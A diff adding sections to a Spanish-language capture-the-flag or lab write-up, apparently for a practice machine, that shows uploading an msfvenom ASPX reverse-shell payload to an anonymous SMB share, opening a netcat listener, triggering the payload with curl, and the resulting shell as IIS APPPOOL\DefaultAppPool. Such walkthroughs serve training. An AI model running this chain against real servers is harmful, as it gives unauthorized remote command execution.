@@ -59,3 +59,41 @@ Glosario del payload:
 | `-e x64/shikata_ga_nai` | Encoder utilizado para modificar el payload. |
 | `-f aspx` | Formato de salida ASPX. |
 | `-o shell.aspx` | Nombre del archivo de salida. |
+
+## Subida del payload 
+
+```
+smbclient //10.129.125.26/nt4wrksv -N -c 'put shell.aspx'
+```
+
+## Listener en kali
+
+```
+sudo nc -nlvp 4444
+
+```
+
+## Ejecución de payload 
+
+```
+curl http://10.129.125.26:49663/nt4wrksv/shell.aspx
+```
+
+## Acceso Inicial
+
+```
+connect to 10.129.125.26 from (UNKNOWN) [10.128.137.118] 49859
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+```
+
+Usuario obtenido:
+
+```
+IIS APPPOOL\DefaultAppPool
+```
+
+
+
